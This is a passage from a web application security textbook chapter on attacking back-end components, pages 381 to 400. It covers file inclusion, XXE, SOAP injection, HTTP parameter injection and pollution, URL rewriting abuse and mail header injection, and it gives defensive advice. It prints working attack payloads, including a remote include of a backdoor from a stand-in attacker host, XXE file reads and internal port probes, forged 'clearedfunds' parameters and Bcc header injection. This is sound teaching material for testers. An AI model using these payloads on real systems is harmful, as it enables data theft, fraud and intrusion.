on most UNIX-based platforms. A similar effect can be achieved on Windows 
platforms (in relation to traversal vulnerabilities, at least) by mounting the 
relevant start directory as a new logical drive and using the associated drive 
letter to access its contents.
The application should integrate its defenses against path traversal attacks 
with its logging and alerting mechanisms. Whenever a request is received that 
contains path traversal sequences, this indicates likely malicious intent on the 
user‚Äôs part. The application should log the request as an attempted security 
breach, terminate the user‚Äôs session, and, if applicable, suspend the user‚Äôs account 
and generate an alert to an administrator.
File Inclusion Vulnerabilities
Many scripting languages support the use of include fi les. This facility enables 
developers to place reusable code components into separate fi les and to include 
these within function-specifi c code fi les as and when they are needed. The code 
within the included fi le is interpreted just as if it had been inserted at the location of the include directive.
Remote File Inclusion
The PHP language is particularly susceptible to fi le inclusion vulnerabilities 
because its include functions can accept a remote fi le path. This has been the 
basis of numerous vulnerabilities in PHP applications.
Consider an application that delivers different content to people in different 
locations. When users choose their location, this is communicated to the server 
via a request parameter, as follows:
https://wahh-app.com/main.php?Country=US
The application processes the Country parameter as follows:
$country = $_GET[‚ÄòCountry‚Äô];
include( $country . ‚Äò.php‚Äô );
This causes the execution environment to load the fi le US.php that is located 
on the web server fi lesystem. The contents of this fi le are effectively copied into 
the main.php fi le and executed.
c10.indd 381 c10.indd 381 8/19/2011 12:10:48 PM 8/19/2011 12:10:48 PM
Stuttard c10.indd V2 - 07/05/2011 Page 382
382 Chapter 10 n Attacking Back-End Components
An attacker can exploit this behavior in different ways, the most serious of 
which is to specify an external URL as the location of the include fi le. The PHP 
include function accepts this as input, and the execution environment retrieves 
the specifi ed fi le and executes its contents. Hence, an attacker can construct 
a malicious script containing arbitrarily complex content, host this on a web 
server he controls, and invoke it for execution via the vulnerable application 
function. For example:
https://wahh-app.com/main.php?Country=http://wahh-attacker.com/backdoor
Local File Inclusion
In some cases, include fi les are loaded on the basis of user-controllable data, but 
it is not possible to specify a URL to a fi le on an external server. For example, 
if user-controllable data is passed to the ASP function Server.Execute, an 
attacker may be able to cause an arbitrary ASP script to be executed, provided 
that this script belongs to the same application as the one that is calling the 
function.
In this situation, you may still be able to exploit the application‚Äôs behavior to 
perform unauthorized actions:
n There may be server-executable fi les on the server that you cannot access 
through the normal route. For example, any requests to the path /admin
may be blocked through application-wide access controls. If you can cause 
sensitive functionality to be included into a page that you are authorized 
to access, you may be able to gain access to that functionality.
n There may be static resources on the server that are similarly protected 
from direct access. If you can cause these to be dynamically included 
into other application pages, the execution environment typically simply 
copies the contents of the static resource into its response.
Finding File Inclusion Vulnerabilities
File inclusion vulnerabilities may arise in relation to any item of user-supplied 
data. They are particularly common in request parameters that specify a language or location. They also often arise when the name of a server-side fi le is 
passed explicitly as a parameter.
c10.indd 382 c10.indd 382 8/19/2011 12:10:48 PM 8/19/2011 12:10:48 PM
Stuttard c10.indd V2 - 07/05/2011 Page 383
 Chapter 10 n Attacking Back-End Components 383
HACK STEPS
To test for remote fi le inclusion fl aws, follow these steps:
 1. Submit in each targeted parameter a URL for a resource on a web server 
that you control, and determine whether any requests are received from 
the server hosting the target application.
 2. If the first test fails, try submitting a URL containing a nonexistent IP 
address, and determine whether a timeout occurs while the server 
attempts to connect.
 3. If the application is found to be vulnerable to remote file inclusion, construct a malicious script using the available APIs in the relevant language, 
as described for dynamic execution attacks.
Local fi le inclusion vulnerabilities can potentially exist in a much wider 
range of scripting environments than those that support remote fi le inclusion. To test for local fi le inclusion vulnerabilities, follow these steps:
 1. Submit the name of a known executable resource on the server, and 
determine whether any change occurs in the application‚Äôs behavior.
 2. Submit the name of a known static resource on the server, and determine 
whether its contents are copied into the application‚Äôs response.
 3. If the application is vulnerable to local file inclusion, attempt to access 
any sensitive functionality or resources that you cannot reach directly via 
the web server.
 4. Test to see if you can access files in other directories using the traversal 
techniques described previously.
Injecting into XML Interpreters
XML is used extensively in today‚Äôs web applications, both in requests and 
responses between the browser and front-end application server and in messages between back-end application components such as SOAP services. Both 
of these locations are susceptible to attacks whereby crafted input is used to 
interfere with the operation of the application and normally perform some 
unauthorized action.
c10.indd 383 c10.indd 383 8/19/2011 12:10:48 PM 8/19/2011 12:10:48 PM
Stuttard c10.indd V2 - 07/05/2011 Page 384
384 Chapter 10 n Attacking Back-End Components
Injecting XML External Entities
In today‚Äôs web applications, XML is often used to submit data from the client 
to the server. The server-side application then acts on this data and may return 
a response containing XML or data in any other format. This behavior is most 
commonly found in Ajax-based applications where asynchronous requests are 
used to communicate in the background. It can also appear in the context of 
browser extension components and other client-side technologies.
For example, consider a search function that, to provide a seamless user 
experience, is implemented using Ajax. When a user enters a search term, a 
client-side script issues the following request to the server:
POST /search/128/AjaxSearch.ashx HTTP/1.1
Host: mdsec.net
Content-Type: text/xml; charset=UTF-8
Content-Length: 44
<Search><SearchTerm>nothing will change</SearchTerm></Search>
The server‚Äôs response is as follows (although vulnerabilities may exist regardless of the format used in responses):
HTTP/1.1 200 OK
Content-Type: text/xml; charset=utf-8
Content-Length: 81
<Search><SearchResult>No results found for expression: nothing will 
change</SearchResult></Search>
The client-side script processes this response and updates part of the user 
interface with the results of the search.
When you encounter this type of functionality, you should always check for 
XML external entity (XXE) injection. This vulnerability arises because standard 
XML parsing libraries support the use of entity references. These are simply a 
method of referencing data either inside or outside the XML document. Entity 
references should be familiar from other contexts. For example, the entities 
corresponding to the < and > characters are as follows:
&lt;
&gt;
The XML format allows custom entities to be defi ned within the XML document itself. This is done within the optional DOCTYPE element at the start of the 
document. For example:
<!DOCTYPE foo [ <!ENTITY testref ‚Äútestrefvalue‚Äù > ]>
c10.indd 384 c10.indd 384 8/19/2011 12:10:48 PM 8/19/2011 12:10:48 PM
Stuttard c10.indd V2 - 07/05/2011 Page 385
 Chapter 10 n Attacking Back-End Components 385
If a document contains this defi nition, the parser replaces any occurrences 
of the &testref; entity reference within the document with the defi ned value, 
testrefvalue.
Furthermore, the XML specifi cation allows entities to be defi ned using external references, the value of which is fetched dynamically by the XML parser. 
These external entity defi nitions use the URL format and can refer to external 
web URLs or resources on the local fi lesystem. The XML parser fetches the 
contents of the specifi ed URL or fi le and uses this as the value of the defi ned 
entity. If the application returns in its response any parts of the XML data that 
use an externally defi ned entity, the contents of the specifi ed fi le or URL are 
returned in the response.
External entities can be specifi ed within the attacker‚Äôs XML-based request 
by adding a suitable DOCTYPE element to the XML (or by modifying the element 
if it already exists). An external entity reference is specifi ed using the SYSTEM
keyword, and its defi nition is a URL that may use the file: protocol.
In the preceding example, the attacker can submit the following request, which 
defi nes an XML external entity that references a fi le on the server‚Äôs fi lesystem:
POST /search/128/AjaxSearch.ashx HTTP/1.1
Host: mdsec.net
Content-Type: text/xml; charset=UTF-8
Content-Length: 115
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ‚Äúfile:///windows/win.ini‚Äù > ]>
<Search><SearchTerm>&xxe;</SearchTerm></Search>
This causes the XML parser to fetch the contents of the specifi ed fi le and to 
use this in place of the defi ned entity reference, which the attacker has used 
within the SearchTerm element. Because the value of this element is echoed in 
the application‚Äôs response, this causes the server to respond with the contents 
of the fi le, as follows:
HTTP/1.1 200 OK
Content-Type: text/xml; charset=utf-8
Content-Length: 556
<Search><SearchResult>No results found for expression: ; for 16-bit app 
support
 [fonts]
 [extensions]
 [mci extensions]
 [files]
...
TRY IT!
http://mdsec.net/search/128/
c10.indd 385 c10.indd 385 8/19/2011 12:10:48 PM 8/19/2011 12:10:48 PM
Stuttard c10.indd V2 - 07/05/2011 Page 386
386 Chapter 10 n Attacking Back-End Components
In addition to using the file: protocol to specify resources on the local 
fi lesystem, the attacker can use protocols such as http: to cause the server to 
fetch resources across the network. These URLs can specify arbitrary hosts, 
IP addresses, and ports. They may allow the attacker to interact with network 
services on back-end systems that cannot be directly reached from the Internet. 
For example, the following attack attempts to connect to a mail server running 
on port 25 on the private IP address 192.168.1.1:
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ‚Äúhttp://192.168.1.1:25‚Äù > ]>
<Search><SearchTerm>&xxe;</SearchTerm></Search>
This technique may allow various attacks to be performed:
n The attacker can use the application as a proxy, retrieving sensitive content 
from any web servers that the application can reach, including those running 
internally within the organization on private, nonroutable address space.
n The attacker can exploit vulnerabilities on back-end web applications, 
provided that these can be exploited via the URL.
n The attacker can test for open ports on back-end systems by cycling through 
large numbers of IP addresses and port numbers. In some cases, timing 
differences can be used to infer the state of a requested port. In other 
cases, the service banners from some services may actually be returned 
within the application‚Äôs responses.
Finally, if the application retrieves the external entity but does not return this 
in responses, it may still be possible to cause a denial of service by reading a 
fi le stream indefi nitely. For example:
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM ‚Äú file:///dev/random‚Äù> ]> 
Injecting into SOAP Services
Simple Object Access Protocol (SOAP) is a message-based communications 
technology that uses the XML format to encapsulate data. It can be used to 
share information and transmit messages between systems, even if these run 
on different operating systems and architectures. Its primary use is in web 
services. In the context of a browser-accessed web application, you are most 
likely to encounter SOAP in the communications that occur between back-end 
application components.
SOAP is often used in large-scale enterprise applications where individual tasks 
are performed by different computers to improve performance. It is also often 
found where a web application has been deployed as a front end to an existing 
application. In this situation, communications between different components 
may be implemented using SOAP to ensure modularity and interoperability.
c10.indd 386 c10.indd 386 8/19/2011 12:10:48 PM 8/19/2011 12:10:48 PM
Stuttard c10.indd V2 - 07/05/2011 Page 387
 Chapter 10 n Attacking Back-End Components 387
Because XML is an interpreted language, SOAP is potentially vulnerable to 
code injection in a similar way as the other examples already described. XML 
elements are represented syntactically, using the metacharacters <, >, and /. If 
user-supplied data containing these characters is inserted directly into a SOAP 
message, an attacker may be able to interfere with the message‚Äôs structure and 
therefore interfere with the application‚Äôs logic or cause other undesirable effects.
Consider a banking application in which a user initiates a funds transfer 
using an HTTP request like the following:
POST /bank/27/Default.aspx HTTP/1.0
Host: mdsec.net
Content-Length: 65
FromAccount=18281008&Amount=1430&ToAccount=08447656&Submit=Submit
In the course of processing this request, the following SOAP message is sent 
between two of the application‚Äôs back-end components:
<soap:Envelope xmlns:soap=‚Äùhttp://www.w3.org/2001/12/soap-envelope‚Äù>
 <soap:Body>
 <pre:Add xmlns:pre=http://target/lists soap:encodingStyle=
‚Äúhttp://www.w3.org/2001/12/soap-encoding‚Äù>
 <Account>
 <FromAccount>18281008</FromAccount>
 <Amount>1430</Amount>
 <ClearedFunds>False</ClearedFunds>
 <ToAccount>08447656</ToAccount>
 </Account>
 </pre:Add>
 </soap:Body>
</soap:Envelope>
Note how the XML elements in the message correspond to the parameters 
in the HTTP request, and also the addition of the ClearedFunds element. At 
this point in the application‚Äôs logic, it has determined that insuffi cient funds 
are available to perform the requested transfer and has set the value of this 
element to False. As a result, the component that receives the SOAP message 
does not act on it.
In this situation, there are various ways in which you could seek to inject 
into the SOAP message and therefore interfere with the application‚Äôs logic. For 
example, submitting the following request causes an additional ClearedFunds
element to be inserted into the message before the original element (while 
preserving the SQL‚Äôs syntactic validity). If the application processes the fi rst 
ClearedFunds element it encounters, you may succeed in performing a transfer 
when no funds are available:
POST /bank/27/Default.aspx HTTP/1.0
Host: mdsec.net
c10.indd 387 c10.indd 387 8/19/2011 12:10:49 PM 8/19/2011 12:10:49 PM
Stuttard c10.indd V2 - 07/05/2011 Page 388
388 Chapter 10 n Attacking Back-End Components
Content-Length: 119
FromAccount=18281008&Amount=1430</Amount><ClearedFunds>True
</ClearedFunds><Amount>1430&ToAccount=08447656&Submit=Submit
On the other hand, if the application processes the last ClearedFunds element 
it encounters, you could inject a similar attack into the ToAccount parameter.
A different type of attack would be to use XML comments to remove part of 
the original SOAP message and replace the removed elements with your own. 
For example, the following request injects a ClearedFunds element via the Amount
parameter, provides the opening tag for the ToAccount element, opens a comment, and closes the comment in the ToAccount parameter, thus preserving the 
syntactic validity of the XML:
POST /bank/27/Default.aspx HTTP/1.0
Host: mdsec.net
Content-Length: 125
FromAccount=18281008&Amount=1430</Amount><ClearedFunds>True
</ClearedFunds><ToAccount><!--&ToAccount=-->08447656&Submit=Submit
A further type of attack would be to attempt to complete the entire SOAP 
message from within an injected parameter and comment out the remainder 
of the message. However, because the opening comment will not be matched 
by a closing comment, this attack produces strictly invalid XML, which many 
XML parsers will reject. This attack is only likely to work against a custom, 
homegrown XML parser, rather than any XML parsing library:
POST /bank/27/Default.aspx HTTP/1.0
Host: mdsec.net
Content-Length: 176
FromAccount=18281008&Amount=1430</Amount><ClearedFunds>True
</ClearedFunds>
<ToAccount>08447656</ToAccount></Account></pre:Add></soap:Body>
</soap:Envelope>
<!--&Submit=Submit
TRY IT!
This example contains a helpful error message that enables you to fi netune your attack:
http://mdsec.net/bank/27/
The following examples contain the identical vulnerability, but the error 
feedback is much more sparse. See how diffi cult it can be to exploit SOAP 
injection without helpful error messages?
http://mdsec.net/bank/18/
http://mdsec.net/bank/6/
c10.indd 388 c10.indd 388 8/19/2011 12:10:49 PM 8/19/2011 12:10:49 PM
Stuttard c10.indd V2 - 07/05/2011 Page 389
 Chapter 10 n Attacking Back-End Components 389
Finding and Exploiting SOAP Injection
SOAP injection can be diffi cult to detect, because supplying XML metacharacters 
in a noncrafted way breaks the format of the SOAP message, often resulting in 
an uninformative error message. Nevertheless, the following steps can be used 
to detect SOAP injection vulnerabilities with a degree of reliability.
HACK STEPS
 1. Submit a rogue XML closing tag such as </foo> in each parameter in turn. 
If no error occurs, your input is probably not being inserted into a SOAP 
message, or it is being sanitized in some way.
 2. If an error was received, submit instead a valid opening and closing tag 
pair, such as <foo></foo>. If this causes the error to disappear, the 
application may be vulnerable.
 3. In some situations, data that is inserted into an XML-formatted message is subsequently read back from its XML form and returned to the 
user. If the item you are modifying is being returned in the application‚Äôs 
responses, see whether any XML content you submit is returned in its 
identical form or has been normalized in some way. Submit the following 
two values in turn:
test<foo/>
test<foo></foo>
If you find that either item is returned as the other, or simply as test,
you can be confident that your input is being inserted into an XML-based 
message.
 4. If the HTTP request contains several parameters that may be being placed 
into a SOAP message, try inserting the opening comment character (<!-
-) into one parameter and the closing comment character (!-->) into 
another parameter. Then switch these around (because you have no way 
of knowing in which order the parameters appear). Doing so can have the 
effect of commenting out a portion of the server‚Äôs SOAP message. This 
may cause a change in the application‚Äôs logic or result in a different error 
condition that may divulge information.
If SOAP injection is diffi cult to detect, it can be even harder to exploit. In most 
situations, you need to know the structure of the XML that surrounds your data 
to supply crafted input that modifi es the message without invalidating it. In all 
the preceding tests, look for any error messages that reveal any details about 
the SOAP message being processed. If you are lucky, a verbose message will 
disclose the entire message, enabling you to construct crafted values to exploit 
the vulnerability. If you are unlucky, you may be restricted to pure guesswork, 
which is very unlikely to be successful.
c10.indd 389 c10.indd 389 8/19/2011 12:10:49 PM 8/19/2011 12:10:49 PM
Stuttard c10.indd V2 - 07/05/2011 Page 390
390 Chapter 10 n Attacking Back-End Components
Preventing SOAP Injection
You can prevent SOAP injection by employing boundary validation fi lters at any 
point where user-supplied data is inserted into a SOAP message (see Chapter 
2). This should be performed both on data that has been immediately received 
from the user in the current request and on any data that has been persisted from 
earlier requests or generated from other processing that takes user data as input.
To prevent the attacks described, the application should HTML-encode any 
XML metacharacters appearing in user input. HTML encoding involves replacing 
literal characters with their corresponding HTML entities. This ensures that the 
XML interpreter treats them as part of the data value of the relevant element and 
not as part of the structure of the message itself. Here are the HTML encodings 
of some common problematic characters:
n < ‚Äî &lt;
n > ‚Äî &gt;
n / ‚Äî &#47;
Injecting into Back-end HTTP Requests
The preceding section described how some applications incorporate user-supplied 
data into back-end SOAP requests to services that are not directly accessible 
to the user. More generally, applications may embed user input in any kind of 
back-end HTTP request, including those that transmit parameters as regular 
name/value pairs. This kind of behavior is often vulnerable to attack, since the 
application often effectively proxies the URL or parameters supplied by the user. 
Attacks against this functionality can be divided into the following categories:
n Server-side HTTP redirection attacks allow an attacker to specify an arbitrary 
resource or URL that is then requested by the front-end application server.
n HTTP parameter injection (HPI) attacks allow an attacker to inject arbitrary parameters into a back-end HTTP request made by the application 
server. If an attacker injects a parameter that already exists in the back-end 
request, HTTP parameter pollution (HPP) attacks can be used to override 
the original parameter value specifi ed by the server.
Server-side HTTP Redirection
Server-side redirection vulnerabilities arise when an application takes usercontrollable input and incorporates it into a URL that it retrieves using a backend HTTP request. The user-supplied input may comprise the entire URL that 
is retrieved, or the application may perform some processing on it, such as 
adding a standard suffi x.
c10.indd 390 c10.indd 390 8/19/2011 12:10:49 PM 8/19/2011 12:10:49 PM
Stuttard c10.indd V2 - 07/05/2011 Page 391
 Chapter 10 n Attacking Back-End Components 391
The back-end HTTP request may be to a domain on the public Internet, 
or it may be to an internal server not directly accessible by the user. The 
content requested may be core to the application‚Äôs functionality, such as an 
interface to a payment gateway. Or it may be more peripheral, such as static 
content drawn from a third party. This technique is often used to knit several 
disparate internal and external application components into a single frontapplication that handles access control and session management on behalf 
of these other systems. If an attacker can control the IP address or hostname 
used in the back-end HTTP request, he can cause the application server to 
connect to an arbitrary resource and sometimes retrieve the contents of the 
back-end response.
Consider the following example of a front-end request, in which the loc
parameter is used to specify which version of a CSS fi le the client wants to use:
POST /account/home HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: wahh-blogs.net
Content-Length: 65
view=default&loc=online.wahh-blogs.net/css/wahh.css
If no validation of the URL is specifi ed in the loc parameter, an attacker can 
specify an arbitrary hostname in place of online.wahh-blogs.net. The application retrieves the specifi ed resource, allowing the attacker to use the application 
as a proxy to potentially sensitive back-end services. In the following example, 
the attacker causes the application to connect to a back-end SSH service:
POST /account/home HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: blogs.mdsec.net
Content-Length: 65
view=default&loc=192.168.0.1:22
The application‚Äôs response includes the banner from the requested SSH service:
HTTP/1.1 200 OK
Connection: close
SSH-2.0-OpenSSH_4.2Protocol mismatch.
An attacker can exploit server-side HTTP redirection bugs to effectively use the 
vulnerable application as an open HTTP proxy to perform various further attacks:
n An attacker may be able to use the proxy to attack third-party systems on 
the Internet. The malicious traffi c appears to the target to originate from 
the server on which the vulnerable application is running.
n An attacker may be able to use the proxy to connect to arbitrary hosts on 
the organization‚Äôs internal network, thereby reaching targets that cannot 
be accessed directly from the Internet.
c10.indd 391 c10.indd 391 8/19/2011 12:10:49 PM 8/19/2011 12:10:49 PM
Stuttard c10.indd V2 - 07/05/2011 Page 392
392 Chapter 10 n Attacking Back-End Components
n An attacker may be able to use the proxy to connect back to other services 
running on the application server itself, circumventing fi rewall restrictions 
and potentially exploiting trust relationships to bypass authentication.
n Finally, the proxy functionality could be used to deliver attacks such as 
cross-site scripting by causing the application to include attacker-controlled 
content within its responses (see Chapter 12 for more details).
HACK STEPS
 1. Identify any request parameters that appear to contain hostnames, IP 
addresses, or full URLs.
 2. For each parameter, modify its value to specify an alternative resource, 
similar to the one being requested, and see if that resource appears in the 
server‚Äôs response.
 3. Try specifying a URL targeting a server on the Internet that you control, 
and monitor that server for incoming connections from the application 
you are testing.
 4. If no incoming connection is received, monitor the time taken for the 
application to respond. If there is a delay, the application‚Äôs back-end 
requests may be timing out due to network restrictions on outbound 
connections.
 5. If you are successful in using the functionality to connect to arbitrary 
URLs, try to perform the following attacks:
 a. Determine whether the port number can be specified. For example, 
you might supply http://mdattacker.net:22.
 b. If successful, attempt to port-scan the internal network by using a tool 
such as Burp Intruder to connect to a range of IP addresses and ports 
in sequence (see Chapter 14).
 c. Attempt to connect to other services on the loopback address of the 
application server.
 d. Attempt to load a web page that you control into the application‚Äôs 
response to deliver a cross-site scripting attack.
NOTE Some server-side redirection APIs, such as Server.Transfer()
and Server.Execute() in ASP.NET, allow redirection only to relative URLs 
on the same host. Functionality that passes user-supplied input to one of 
these methods can still potentially be exploited to exploit trust relationships and access resources on the server that are protected by platform-level 
authentication.
c10.indd 392 c10.indd 392 8/19/2011 12:10:49 PM 8/19/2011 12:10:49 PM
Stuttard c10.indd V2 - 07/05/2011 Page 393
 Chapter 10 n Attacking Back-End Components 393
TRY IT!
http://mdsec.net/updates/97/
http://mdsec.net/updates/99/
HTTP Parameter Injection
HTTP parameter injection (HPI) arises when user-supplied parameters are 
used as parameters within a back-end HTTP request. Consider the following 
variation on the bank transfer functionality that was previously vulnerable to 
SOAP injection:
POST /bank/48/Default.aspx HTTP/1.0
Host: mdsec.net
Content-Length: 65
FromAccount=18281008&Amount=1430&ToAccount=08447656&Submit=Submit
This front-end request, sent from the user‚Äôs browser, causes the application 
to make a further back-end HTTP request to another web server within the 
bank‚Äôs infrastructure. In this back-end request, the application copies some of 
the parameter values from the front-end request:
POST /doTransfer.asp HTTP/1.0
Host: mdsec-mgr.int.mdsec.net
Content-Length: 44
fromacc=18281008&amount=1430&toacc=08447656
This request causes the back-end server to check whether cleared funds are 
available to perform the transfer and, if so, to carry it out. However, the frontend server can optionally specify that cleared funds are available, and therefore 
bypass the check, by supplying the following parameter:
clearedfunds=true
If the attacker is aware of this behavior, he can attempt to perform an HPI 
attack to inject the clearedfunds parameter into the back-end request. To do 
this, he adds the required parameter onto the end of an existing parameter‚Äôs 
value and URL-encodes the characters & and =, which are used to separate 
names and values:
POST /bank/48/Default.aspx HTTP/1.0
Host: mdsec.net
Content-Length: 96
FromAccount=18281008&Amount=1430&ToAccount=08447656%26clearedfunds%3dtru
e&Submit=Submit
c10.indd 393 c10.indd 393 8/19/2011 12:10:49 PM 8/19/2011 12:10:49 PM
Stuttard c10.indd V2 - 07/05/2011 Page 394
394 Chapter 10 n Attacking Back-End Components
When the application server processes this request, it URL-decodes the parameter values in the normal way. So the value of the ToAccount parameter that the 
front-end application receives is as follows:
08447656&clearedfunds=true
If the front-end application does not validate this value and passes it through 
unsanitized into the back-end request, the following back-end request is made, 
which successfully bypasses the check for cleared funds:
POST /doTransfer.asp HTTP/1.0
Host: mdsec-mgr.int.mdsec.net
Content-Length: 62
fromacc=18281008&amount=1430&toacc=08447656&clearedfunds=true
TRY IT!
http://mdsec.net/bank/48/
NOTE Unlike with SOAP injection, injecting arbitrary unexpected parameters 
into a back-end request is unlikely to cause any kind of error. Therefore, a successful attack normally requires exact knowledge of the back-end parameters 
that are being used. Although this may be hard to determine in a blackbox 
context, it may be straightforward if the application uses any third-party components whose code can be obtained and researched.
HTTP Parameter Pollution
HPP is an attack technique that arises in various contexts (see Chapters 12 and 
13 for other examples) and that often applies in the context of HPI attacks.
The HTTP specifi cations provide no guidelines as to how web servers should 
behave when a request contains multiple parameters with the same name. In 
practice, different web servers behave in different ways. Here are some common behaviors:
n Use the fi rst instance of the parameter.
n Use the last instance of the parameter.
n Concatenate the parameter values, maybe adding a separator between them.
n Construct an array containing all the supplied values.
In the preceding HPI example, the attacker could add a new parameter to 
a back-end request. In fact, it is more likely in practice that the request into 
which the attacker can inject already contains a parameter with the name he 
c10.indd 394 c10.indd 394 8/19/2011 12:10:49 PM 8/19/2011 12:10:49 PM
Stuttard c10.indd V2 - 07/05/2011 Page 395
 Chapter 10 n Attacking Back-End Components 395
is targeting. In this situation, the attacker can use the HPI condition to inject a 
second instance of the same parameter. The resulting application behavior then 
depends on how the back-end HTTP server handles the duplicated parameter. 
The attacker may be able to use the HPP technique to ‚Äúoverride‚Äù the value of 
the original parameter with the value of his injected parameter.
For example, if the original back-end request is as follows:
POST /doTransfer.asp HTTP/1.0
Host: mdsec-mgr.int.mdsec.net
Content-Length: 62
fromacc=18281008&amount=1430&clearedfunds=false&toacc=08447656
and the back-end server uses the fi rst instance of any duplicated parameter, an 
attacker can place the attack into the FromAccount parameter in the front-end 
request:
POST /bank/52/Default.aspx HTTP/1.0
Host: mdsec.net
Content-Length: 96
FromAccount=18281008%26clearedfunds%3dtrue&Amount=1430&ToAccount=0844765
6&Submit=Submit
Conversely, in this example, if the back-end server uses the last instance of 
any duplicated parameter, the attacker can place the attack into the ToAccount
parameter in the front-end request.
TRY IT!
http://mdsec.net/bank/52/
http://mdsec.net/bank/57/
The results of HPP attacks are heavily dependent on how the target application server handles multiple occurrences of the same parameter, and the precise 
insertion point within the back-end request. This has signifi cant consequences 
if two technologies need to process the same HTTP request. A web application 
fi rewall or reverse proxy may process a request and pass it to the web application, 
which may proceed to discard variables, or even build strings out of previously 
disparate portions of the request!
A good paper covering the different behaviors of the common application 
servers can be found here:
www.owasp.org/images/b/ba/AppsecEU09_CarettoniDiPaola_v0.8.pdf
c10.indd 395 c10.indd 395 8/19/2011 12:10:49 PM 8/19/2011 12:10:49 PM
Stuttard c10.indd V2 - 07/05/2011 Page 396
396 Chapter 10 n Attacking Back-End Components
Attacks Against URL Translation
Many servers rewrite requested URLs on arrival to map these onto the relevant 
back-end functions within the application. In addition to conventional URL 
rewriting, this behavior can arise in the context of REST-style parameters, custom navigation wrappers, and other methods of URL translation. The kind of 
processing that this behavior involves can be vulnerable to HPI and HPP attacks.
For simplicity and to aid navigation, some applications place parameter values 
within the fi le path of the URL, rather than the query string. This can often be 
achieved with some simple rules to transform the URL and forward it to the 
true destination. The following mod_rewrite rules in Apache are used to handle 
public access to user profi les:
RewriteCond %{THE_REQUEST} ^[A-Z]{3,9}\ /pub/user/[^\&]*\ HTTP/
RewriteRule ^pub/user/([^/\.]+)$ /inc/user_mgr.php?mode=view&name=$1
This rule takes aesthetically pleasing requests such as:
/pub/user/marcus
and transforms them into back-end requests for the view functionality contained 
within the user management page user_mgr.php. It moves the marcus parameter 
into the query string and adds the mode=view parameter:
/inc/user_mgr.php?mode=view&name=marcus
In this situation, it may be possible to use an HPI attack to inject a second mode
parameter into the rewritten URL. For example, if the attacker requests this:
/pub/user/marcus%26mode=edit
the URL-decoded value is embedded in the rewritten URL as follows:
/inc/user_mgr.php?mode=view&name=marcus&mode=edit
As was described for HPP attacks, the success of this exploit depends on 
how the server handles the now-duplicated parameter. On the PHP platform, 
the mode parameter is treated as having the value edit, so the attack succeeds.
c10.indd 396 c10.indd 396 8/19/2011 12:10:49 PM 8/19/2011 12:10:49 PM
Stuttard c10.indd V2 - 07/05/2011 Page 397
 Chapter 10 n Attacking Back-End Components 397
HACK STEPS
 1. Target each request parameter in turn, and try to append a new injected 
parameter using various syntax:
n %26foo%3dbar ‚Äî URL-encoded &foo=bar
n %3bfoo%3dbar ‚Äî URL-encoded ;foo=bar
n %2526foo%253dbar ‚Äî Double URL-encoded &foo=bar
 2. Identify any instances where the application behaves as if the original 
parameter were unmodified. (This applies only to parameters that usually 
cause some difference in the application‚Äôs response when modified.)
 3. Each instance identified in the previous step has a chance of parameter 
injection. Attempt to inject a known parameter at various points in the 
request to see if it can override or modify an existing parameter. For 
example:
FromAccount=18281008%26Amount%3d4444&Amount=1430&ToAcco
unt=08447656
 4. If this causes the new value to override the existing one, determine 
whether you can bypass any front-end validation by injecting a value that 
is read by a back-end server.
 5. Replace the injected known parameter with additional parameter names 
as described for application mapping and content discovery in Chapter 4.
 6. Test the application‚Äôs tolerance of multiple submissions of the same 
parameter within a request. Submit redundant values before and after 
other parameters, and at different locations within the request (within the 
query string, cookies, and the message body).
Injecting into Mail Services
Many applications contain a facility for users to submit messages via the application, such as to report a problem to support personnel or provide feedback 
about the website. This facility is usually implemented by interfacing with a 
mail (or SMTP) server. Typically, user-supplied input is inserted into the SMTP 
c10.indd 397 c10.indd 397 8/19/2011 12:10:49 PM 8/19/2011 12:10:49 PM
Stuttard c10.indd V2 - 07/05/2011 Page 398
398 Chapter 10 n Attacking Back-End Components
conversation that the application server conducts with the mail server. If an 
attacker can submit suitable crafted input that is not fi ltered or sanitized, he 
may be able to inject arbitrary STMP commands into this conversation.
In most cases, the application enables you to specify the contents of the message and your own e-mail address (which is inserted into the From fi eld of the 
resulting e-mail). You may also be able to specify the subject of the message and 
other details. Any relevant fi eld that you control may be vulnerable to SMTP 
injection.
SMTP injection vulnerabilities are often exploited by spammers who scan 
the Internet for vulnerable mail forms and use these to generate large volumes 
of nuisance e-mail.
E-mail Header Manipulation
Consider the form shown in Figure 10-6, which allows users to send feedback 
about the application.
Figure 10-6: A typical site feedback form
Here, users can specify a From address and the contents of the message. The 
application passes this input to the PHP mail() command, which constructs 
the e-mail and performs the necessary SMTP conversation with its confi gured 
mail server. The mail generated is as follows:
To: admin@wahh-app.com
From: marcus@wahh-mail.com
Subject: Site problem
Confirm Order page doesn‚Äôt load
The PHP mail() command uses an additional_headers parameter to set the 
message‚Äôs From address. This parameter is also used to specify other headers, 
including Cc and Bcc, by separating each required header with a newline character. Hence, an attacker can cause the message to be sent to arbitrary recipients 
by injecting one of these headers into the From fi eld, as illustrated in Figure 10-7.
c10.indd 398 c10.indd 398 8/19/2011 12:10:49 PM 8/19/2011 12:10:49 PM
Stuttard c10.indd V2 - 07/05/2011 Page 399
 Chapter 10 n Attacking Back-End Components 399
Figure 10-7: An e-mail header injection attack
This causes the mail() command to generate the following message:
To: admin@wahh-app.com
From: marcus@wahh-mail.com
Bcc: all@wahh-othercompany.com
Subject: Site problem
Confirm Order page doesn‚Äôt load
SMTP Command Injection
In other cases, the application may perform the SMTP conversation itself, or it 
may pass user-supplied input to a different component to do this. In this situation, it may be possible to inject arbitrary SMTP commands directly into this 
conversation, potentially taking full control of the messages being generated 
by the application.
For example, consider an application that uses requests of the following form 
to submit site feedback:
POST feedback.php HTTP/1.1
Host: wahh-app.com
Content-Length: 56
From=daf@wahh-mail.com&Subject=Site+feedback&Message=foo
This causes the web application to perform an SMTP conversation with the 
following commands:
MAIL FROM: daf@wahh-mail.com
RCPT TO: feedback@wahh-app.com
DATA
From: daf@wahh-mail.com
To: feedback@wahh-app.com
Subject: Site feedback
foo
.
c10.indd 399 c10.indd 399 8/19/2011 12:10:50 PM 8/19/2011 12:10:50 PM
Stuttard c10.indd V2 - 07/05/2011 Page 400
400 Chapter 10 n Attacking Back-End Components
NOTE After the SMTP client issues the DATA command, it sends the contents 
of the e-mail message, comprising the message headers and body. Then it 
